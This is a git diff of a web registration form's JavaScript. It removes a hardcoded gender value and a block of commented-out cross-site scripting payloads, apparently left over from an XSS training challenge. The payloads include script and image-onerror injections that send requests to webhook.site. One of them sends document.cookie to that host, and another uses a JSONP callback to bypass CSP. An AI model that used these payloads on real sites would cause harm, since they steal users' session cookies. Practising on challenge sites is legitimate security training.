@@ -73,8 +73,6 @@ function sendPostServer(photo, extension) {
         "bday": document.forms["registrationForm"]["bday"].value,
         "name": document.forms["registrationForm"]["name"].value,
         "surname": document.forms["registrationForm"]["surname"].value,
-        // "gender": document.forms["registrationForm"]["gender"].value,
-        "gender": "other",
         "photo": photo,
         "extension": extension
     };
@@ -97,41 +95,3 @@ function showAlertWithError(errorText) {
     $("#errorAlertText").html(errorText);
     $("#errorAlert").addClass('show');
 }
-
-
-
-// <h1> <script> window.location.href="https://webhook.site/ec1b88f5-3e54-45f4-a8d1-e908a01e8e3f"; </script> </h1>
-
-
-// <h1> <script> 
-//   https://xss.challenge.training.hacq.me/challenges/baby01.php
-//  </script> </h1>
-
-
-// <img src='#' onerror=fetch("https://webhook.site/29601392-3225-44b7-963f-911784ca5c5a")>
-
-
-// <h1> <img src= https://webhook.site/ec1b88f5-3e54-45f4-a8d1-e908a01e8e3f ></img></h1>
-
-
-// </h1> <script> 
-//   fetch("https://xss.challenge.training.hacq.me/challenges/csp01-jsonp.php?callback=alert(1);");
-//  </script> 
-//  <h1>
-
-// <img src="" onerror="fetch('https://webhook.site/ec1b88f5-3e54-45f4-a8d1-e908a01e8e3f/SONOIO' + document.cookie);">
-
-
-
-
-// </h1 <script>
-
-// </h1>
-// <script src="csp01-jsonp.php?callback=alert(1);callback">
-// </script>  
-// <h1>
-  
-
-
-
-// https://xss.challenge.training.hacq.me/challenges/csp01-jsonp.php?callback=callback
